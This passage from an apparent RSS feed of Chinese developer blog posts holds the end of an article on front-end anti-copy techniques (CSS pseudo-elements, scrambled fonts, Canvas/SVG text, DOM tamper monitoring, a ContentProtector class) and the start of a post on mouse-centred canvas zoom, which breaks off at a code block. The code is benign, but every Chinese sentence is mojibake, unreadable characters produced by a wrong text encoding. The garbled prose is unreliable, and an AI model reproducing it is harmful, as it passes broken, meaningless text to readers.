<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'text'</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title function_">obfuscateText</span>(originalText);
</code></pre>
<hr/>
<h3 data-id="heading-5">6. ä½¿ç”¨CSSä¼ªå…ƒç´ æ˜¾ç¤ºå†…å®¹</h3>
<p>é€šè¿‡CSSçš„<code>::before</code>æˆ–<code>::after</code>ä¼ªå…ƒç´ æ˜¾ç¤ºæ–‡æœ¬ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.protected-content</span><span class="hljs-selector-pseudo">::before</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-string">"è¿™æ®µæ–‡å­—é€šè¿‡CSSç”Ÿæˆï¼Œæ— æ³•ç›´æ¥é€‰ä¸­å’Œå¤åˆ¶"</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"protected-content"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-6">7. å­—ä½“åçˆ¬è™«æŠ€æœ¯</h3>
<p>ä½¿ç”¨è‡ªå®šä¹‰å­—ä½“æ–‡ä»¶ï¼Œå°†å­—ç¬¦æ˜ å°„å…³ç³»æ‰“ä¹±ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-keyword">@font-face</span> {
  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'CustomFont'</span>;
  <span class="hljs-attribute">src</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">'custom-font.woff2'</span>) <span class="hljs-built_in">format</span>(<span class="hljs-string">'woff2'</span>);
}

<span class="hljs-selector-class">.protected-text</span> {
  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'CustomFont'</span>;
}
</code></pre>
<p>åœ¨å­—ä½“æ–‡ä»¶ä¸­ï¼Œå°†å®é™…å­—ç¬¦ä¸æ˜¾ç¤ºå­—ç¬¦çš„æ˜ å°„å…³ç³»æ‰“ä¹±ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>å­—ç¬¦<code>a</code>åœ¨å­—ä½“ä¸­å®é™…æ˜¾ç¤ºä¸º<code>b</code></li>
<li>å­—ç¬¦<code>b</code>æ˜¾ç¤ºä¸º<code>c</code>ï¼Œä»¥æ­¤ç±»æ¨</li>
</ul>
<p><strong>åç«¯é…åˆ</strong>ï¼šæœåŠ¡å™¨åŠ¨æ€ç”Ÿæˆå­—ä½“æ–‡ä»¶ï¼Œå®šæœŸæ›´æ¢æ˜ å°„å…³ç³»ã€‚</p>
<hr/>
<h3 data-id="heading-7">8.  Canvas + WebGL æ¸²æŸ“æ–‡æœ¬</h3>
<p>ä½¿ç”¨æ›´å¤æ‚çš„å›¾å½¢æ¸²æŸ“æŠ€æœ¯ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"textCanvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"800"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"100"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'textCanvas'</span>);
  <span class="hljs-keyword">const</span> ctx = canvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>);
  
  <span class="hljs-comment">// è®¾ç½®æ–‡å­—æ ·å¼</span>
  ctx.<span class="hljs-property">font</span> = <span class="hljs-string">'24px Arial'</span>;
  ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">'#333'</span>;
  
  <span class="hljs-comment">// ç»˜åˆ¶å¹²æ‰°å…ƒç´ </span>
  ctx.<span class="hljs-title function_">fillText</span>(<span class="hljs-string">'ä¿æŠ¤å†…å®¹'</span>, <span class="hljs-number">50</span>, <span class="hljs-number">50</span>);
  
  <span class="hljs-comment">// æ·»åŠ å™ªå£°å¹²æ‰°</span>
  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
    ctx.<span class="hljs-title function_">fillRect</span>(
      <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">800</span>, 
      <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">100</span>, 
      <span class="hljs-number">1</span>, <span class="hljs-number">1</span>
    );
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-8">9. SVG æ–‡æœ¬æ¸²æŸ“</h3>
<p>ä½¿ç”¨SVGæ¸²æŸ“æ–‡æœ¬ï¼Œå¢åŠ é€‰æ‹©éš¾åº¦ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"100"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">y</span>=<span class="hljs-string">"30"</span> <span class="hljs-attr">font-family</span>=<span class="hljs-string">"Arial"</span> <span class="hljs-attr">font-size</span>=<span class="hljs-string">"20"</span> 
        <span class="hljs-attr">fill</span>=<span class="hljs-string">"black"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"user-select: none;"</span>&gt;</span>
    è¿™æ®µSVGæ–‡æœ¬éš¾ä»¥å¤åˆ¶
  <span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- æ·»åŠ å¹²æ‰°è·¯å¾„ --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">path</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M10,40 L390,40"</span> <span class="hljs-attr">stroke</span>=<span class="hljs-string">"#eee"</span> <span class="hljs-attr">stroke-width</span>=<span class="hljs-string">"1"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-9">10. å®æ—¶DOMç›‘æ§ä¸ä¿®å¤</h3>
<p>ç›‘æ§DOMå˜åŒ–ï¼Œé˜²æ­¢ç”¨æˆ·é€šè¿‡å¼€å‘è€…å·¥å…·ä¿®æ”¹å†…å®¹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> contentElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'protected-content'</span>);
<span class="hljs-keyword">const</span> originalContent = contentElement.<span class="hljs-property">innerHTML</span>;

<span class="hljs-comment">// å®šæ—¶æ£€æŸ¥å†…å®¹å®Œæ•´æ€§</span>
<span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (contentElement.<span class="hljs-property">innerHTML</span> !== originalContent) {
    contentElement.<span class="hljs-property">innerHTML</span> = originalContent;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ£€æµ‹åˆ°å†…å®¹ç¯¡æ”¹ï¼Œå·²æ¢å¤'</span>);
  }
}, <span class="hljs-number">500</span>);

<span class="hljs-comment">// ä½¿ç”¨MutationObserveræ›´ç²¾ç¡®çš„ç›‘æ§</span>
<span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MutationObserver</span>(<span class="hljs-function">(<span class="hljs-params">mutations</span>) =&gt;</span> {
  mutations.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">mutation</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (mutation.<span class="hljs-property">type</span> === <span class="hljs-string">'childList'</span> || mutation.<span class="hljs-property">type</span> === <span class="hljs-string">'characterData'</span>) {
      contentElement.<span class="hljs-property">innerHTML</span> = originalContent;
    }
  });
});

observer.<span class="hljs-title function_">observe</span>(contentElement, {
  <span class="hljs-attr">childList</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">characterData</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">subtree</span>: <span class="hljs-literal">true</span>
});
</code></pre>
<hr/>
<h3 data-id="heading-10">ç»¼åˆé˜²å¾¡ç­–ç•¥å»ºè®®</h3>
<p>å¯¹äºé«˜å®‰å…¨è¦æ±‚çš„åœºæ™¯ï¼Œå»ºè®®é‡‡ç”¨<strong>åˆ†å±‚é˜²å¾¡</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ContentProtector</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>();
  }
  
  <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">disableSelection</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">bindEvents</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">startMonitoring</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">obfuscateContent</span>();
  }
  
  <span class="hljs-title function_">disableSelection</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>.<span class="hljs-title function_">insertAdjacentHTML</span>(<span class="hljs-string">'beforeend'</span>, <span class="hljs-string">`
      &lt;style&gt;
        body { -webkit-user-select: none; user-select: none; }
        .protected { cursor: default; }
      &lt;/style&gt;
    `</span>);
  }
  
  <span class="hljs-title function_">bindEvents</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// ç»‘å®šæ‰€æœ‰é˜»æ­¢äº‹ä»¶</span>
    [<span class="hljs-string">'copy'</span>, <span class="hljs-string">'cut'</span>, <span class="hljs-string">'paste'</span>, <span class="hljs-string">'contextmenu'</span>, <span class="hljs-string">'keydown'</span>].<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> {
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(event, <span class="hljs-variable language_">this</span>.<span class="hljs-property">preventDefault</span>);
    });
  }
  
  <span class="hljs-title function_">preventDefault</span>(<span class="hljs-params">e</span>) {
    e.<span class="hljs-title function_">preventDefault</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }
  
  <span class="hljs-title function_">startMonitoring</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// å¯åŠ¨å„ç§ç›‘æ§</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">monitorDevTools</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">monitorDOMChanges</span>();
  }
  
  <span class="hljs-title function_">obfuscateContent</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// å†…å®¹æ··æ·†å¤„ç†</span>
    <span class="hljs-comment">// ...</span>
  }
  
  <span class="hljs-title function_">monitorDevTools</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// å¼€å‘è€…å·¥å…·æ£€æµ‹</span>
    <span class="hljs-comment">// ...</span>
  }
  
  <span class="hljs-title function_">monitorDOMChanges</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// DOMå˜åŒ–ç›‘æ§</span>
    <span class="hljs-comment">// ...</span>
  }
}

<span class="hljs-comment">// åˆå§‹åŒ–ä¿æŠ¤</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">ContentProtector</span>();
</code></pre>
<hr/>
<h3 data-id="heading-11">æ€»ç»“</h3>
<p>è¿™äº›æ–¹æ³•åªèƒ½é˜²æ™®é€šç”¨æˆ·ï¼Œé˜²ä¸ä½çœŸæ­£æƒ³å¤åˆ¶çš„äººã€‚</p>
<p>å› ä¸ºåˆ«äººè¿˜æ˜¯å¯ä»¥é€šè¿‡çœ‹æºç ã€æˆªå›¾ã€å…³æ‰ JS ç­‰æ–¹å¼ç»•è¿‡é™åˆ¶ã€‚</p>
<p>æ‰€ä»¥å»ºè®®ï¼š</p>
<ul>
<li><strong>åˆ«è¿‡åº¦é˜²æŠ¤</strong>ï¼Œä»¥å…å½±å“æ­£å¸¸ç”¨æˆ·å’Œ SEOï¼›</li>
<li><strong>é‡è¦å†…å®¹é åç«¯æ§åˆ¶</strong>ï¼ˆæ¯”å¦‚ç™»å½•æ‰èƒ½çœ‹å…¨æ–‡ï¼‰ï¼›</li>
<li><strong>ç»„åˆä½¿ç”¨å‡ ç§æ–¹æ³•</strong>ï¼Œæé«˜é—¨æ§›å°±å¥½ï¼Œåˆ«è¿½æ±‚ç»å¯¹å®‰å…¨ã€‚</li>
</ul>
<p>æ¯•ç«Ÿå‰ç«¯å±•ç¤ºçš„å†…å®¹ï¼Œå°±é»˜è®¤æ˜¯èƒ½è¢«çœ‹åˆ°çš„ï¼Œä¹Ÿå°±èƒ½è¢«å¤åˆ¶çš„ã€‚</p>
<blockquote>
<p>æœ¬æ–‡é¦–å‘äºå…¬ä¼—å·ï¼šç¨‹åºå‘˜åˆ˜å¤§åï¼Œä¸“æ³¨åˆ†äº«å‰åç«¯å¼€å‘çš„å®æˆ˜ç¬”è®°ã€‚å…³æ³¨æˆ‘ï¼Œå°‘èµ°å¼¯è·¯ï¼Œä¸€èµ·è¿›æ­¥ï¼</p>
</blockquote>
<h4 data-id="heading-12">ğŸ“Œå¾€æœŸç²¾å½©</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F6V83qjR6u0nyfzL-14xYAw" target="_blank" title="https://mp.weixin.qq.com/s/6V83qjR6u0nyfzL-14xYAw" ref="nofollow noopener noreferrer">ã€Šasync/await åˆ°åº•è¦ä¸è¦åŠ  try-catchï¼Ÿå¼‚æ­¥é”™è¯¯å¤„ç†æœ€ä½³å®è·µã€‹</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FIvdZqX7sR8DAZE8B5R5eTQ" target="_blank" title="https://mp.weixin.qq.com/s/IvdZqX7sR8DAZE8B5R5eTQ" ref="nofollow noopener noreferrer">ã€Šéƒ½åœ¨ç”¨ Java8 å’Œ Java17ï¼Œé‚£ Java9 åˆ° 16 å‘¢ï¼Ÿä»–ä»¬çœŸçš„æ²¡ç”¨å—ï¼Ÿã€‹</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fp0n2mN5RDDDaIWuHHVRUZQ" target="_blank" title="https://mp.weixin.qq.com/s/p0n2mN5RDDDaIWuHHVRUZQ" ref="nofollow noopener noreferrer">ã€ŠJava å¼€å‘å¿…çœ‹ï¼šä»€ä¹ˆæ—¶å€™ç”¨ forï¼Œä»€ä¹ˆæ—¶å€™ç”¨ Streamï¼Ÿã€‹</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FqI3TRTdDfRJSH9kCTqAQUw" target="_blank" title="https://mp.weixin.qq.com/s/qI3TRTdDfRJSH9kCTqAQUw" ref="nofollow noopener noreferrer">ã€Šè¿™ 10 ä¸ª MySQL é«˜çº§ç”¨æ³•ï¼Œè®©ä½ çš„ä»£ç åˆå¿«åˆå¥½çœ‹ã€‹</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Virtual World 005ã€‘ä¸Šå¸ä¹‹çœ¼]]></title>    <link>https://juejin.cn/post/7581761825482489892</link>    <guid>https://juejin.cn/post/7581761825482489892</guid>    <pubDate>2025-12-10T02:54:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581761825482489892" data-draft-id="7577971299743580198" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Virtual World 005ã€‘ä¸Šå¸ä¹‹çœ¼"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,HTML"/> <meta itemprop="datePublished" content="2025-12-10T02:54:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§æ€ªv"/> <meta itemprop="url" content="https://juejin.cn/user/4391901700043284"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Virtual World 005ã€‘ä¸Šå¸ä¹‹çœ¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4391901700043284/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§æ€ªv
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:54:19.000Z" title="Wed Dec 10 2025 02:54:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿™æ˜¯<strong>çº¯å‰ç«¯æ‰‹æ“è™šæ‹Ÿä¸–ç•Œ</strong>ç¬¬äº”ç¯‡ã€‚</p>
<h2 data-id="heading-0">é«˜ç»è¿œç©</h2>
<p>å‰ç«¯ä½¬ä»¬ï¼Œä¸Šä¸€ç¯‡æˆ‘ä»¬åŸºæœ¬å®ç°äº†â€œä¸€ä¸ªæ— é™ç©ºé—´â€çš„<code>canvas</code>ï¼Œå¥½è™½ç„¶æ˜¯å¥½ï¼Œä½†è¿™ç§æ–¹å¼ï¼Œä½ çš„è§†é‡è¢«é”æ­»äº†ã€‚è¿™å°±å¥½æ¯”ä½ åœ¨çœ‹åœ°å›¾æ—¶ï¼Œå´è¢«ç¦ç”¨äº†â€œç¼©æ”¾â€åŠŸèƒ½ä¸€æ ·ã€‚</p>
<p>è¿™å®Œå…¨ä¸§å¤±äº†é‚£ç§é«˜ç»è¿œç©çš„æ„Ÿè§‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29505254560d43508a0470cb57d61a09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5oCqdg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940058&amp;x-signature=7aOiJb8WAOcdORvI7NtzRwiCqUg%3D" alt="image.png" loading="lazy"/></p>
<p>æœ¬ç¯‡è¦ç»™åŠ è¿™å¥—é€»è¾‘ï¼Œæ ¸å¿ƒäº¤äº’æ˜¯ï¼š<strong>é¼ æ ‡æ»šè½®æ»šåŠ¨æ—¶ï¼Œä»¥é¼ æ ‡å½“å‰ä½ç½®ä¸ºä¸­å¿ƒï¼Œè¿›è¡Œæ”¾å¤§æˆ–ç¼©å°ã€‚</strong></p>
<p>åˆ«å°çœ‹è¿™ä¸ªâ€œä»¥é¼ æ ‡ä¸ºä¸­å¿ƒâ€ï¼Œå¾ˆå¤šåˆå­¦è€…å†™å‡ºæ¥çš„ç¼©æ”¾ï¼Œä¸€æ»šè½®ä¸‹å»ï¼Œç”»é¢ç›´æ¥é£åˆ°ä¹éœ„äº‘å¤–å»äº†ï¼ˆé€šå¸¸æ˜¯ç¼©æ”¾åˆ° (0,0) åŸç‚¹å»äº†ï¼‰ã€‚æˆ‘ä»¬çš„ç›®æ ‡ï¼Œæ˜¯ä¸èˆ¬é¡ºæ»‘çš„ä¸“ä¸šçº§ç¼©æ”¾ã€‚</p>
<hr/>
<h2 data-id="heading-1">æˆ˜ç•¥æ€è€ƒ</h2>
<p>è¿˜æ˜¯è€è§„çŸ©ï¼Œæ€ä¹ˆå»å®ç°è¿™ç©æ„å‘¢ï¼Ÿï¼Ÿ</p>
<p>åº”è¯¥æœ‰å‰ç«¯ä½¬çš„ç¬¬ä¸€æƒ³æ³•ï¼Œæ˜¯canvasçš„ç¼©æ”¾ <code>scale</code> åŠŸèƒ½ã€‚</p>
<p>bingoï¼ï¼ä¼˜ç§€å¦‚ä½ ï¼</p>
<p>å°±æ˜¯å®ƒã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e7245e7df0f4dbd8076ddfabc97d6ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5oCqdg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940058&amp;x-signature=D2%2FTtk2xaSy2C2%2BXpkFr7%2BrjOLs%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2">æˆ˜æœ¯è§„åˆ’</h2>
<ul>
<li>
<p><strong>ç¬¬ä¸€æ­¥ï¼šæ•°å­¦åŸç†ä¿®æ­£</strong>ã€‚å¼•å…¥ç¼©æ”¾ï¼ˆScaleï¼‰åï¼Œå±å¹•ä¸Šçš„ 100px å¯èƒ½åªä»£è¡¨ä¸–ç•Œé‡Œçš„ 50pxï¼ˆæ”¾å¤§ 2 å€ï¼‰ã€‚ä¹‹å‰çš„å…¬å¼è¦æ”¹ã€‚</p>
</li>
<li>
<p><strong>ç¬¬äºŒæ­¥ï¼šå®ç°â€œå®šç‚¹ç¼©æ”¾â€</strong> ã€‚</p>
<ul>
<li>åŸç†ï¼šåœ¨ç¼©æ”¾å‘ç”Ÿ<strong>å‰</strong>ï¼Œè®°ä¸‹é¼ æ ‡æŒ‡å‘çš„ä¸–ç•Œåæ ‡ <code>P1</code>ã€‚</li>
<li>æ‰§è¡Œç¼©æ”¾ï¼ˆæ”¹å˜ <code>zoom</code> å€¼ï¼‰ã€‚</li>
<li>åœ¨ç¼©æ”¾å‘ç”Ÿ<strong>å</strong>ï¼Œè®¡ç®—é¼ æ ‡ç°åœ¨æŒ‡å‘çš„ä¸–ç•Œåæ ‡ <code>P2</code>ã€‚</li>
<li>è®¡ç®—åç§»é‡ <code>delta = P2 - P1</code>ï¼Œå¹¶æŠŠå®ƒåŠ å›åˆ°è§†å£çš„ <code>offset</code> é‡Œã€‚</li>
<li><strong>ä¸€å¥è¯è§£é‡Š</strong>ï¼šå¦‚æœç”»é¢å› ä¸ºç¼©æ”¾è·‘åäº†ï¼Œæˆ‘ä»¬å°±æŠŠå®ƒæ‹½å›æ¥ã€‚</li>
</ul>
</li>
<li>
<p><strong>ç¬¬ä¸‰æ­¥ï¼šæ¸²æŸ“å±‚åº”ç”¨</strong>ã€‚<code>translate</code> å’Œ <code>scale</code> çš„é¡ºåºè‡³å…³é‡è¦ã€‚</p>
</li>
</ul>
<hr/>
<h2 data-id="heading-3">ä¸Šä»£ç </h2>
<h3 data-id="heading-4">æ›´æ”¹<code>Viewport</code>ç±»</h3>
<p>å» <code>src/view/viewport.js</code> åŠ¨å¤§æ‰‹æœ¯ã€‚</p>
<p><strong>æ³¨æ„ï¼š</strong> è¿™é‡Œæˆ‘ä»¬è¦ä¿®æ­£ä¸€ä¸‹ä¸Šä¸€ç¯‡çš„ <code>getMouse</code> é€»è¾‘ã€‚æ ‡å‡†çš„å›¾å½¢å­¦åšæ³•æ˜¯ï¼š<strong>æ”¾å¤§ = è§†é‡å˜å° = åæ ‡é™¤ä»¥ç¼©æ”¾ç³»æ•°</strong>ã€‚</p>
<p>JavaScript</p>
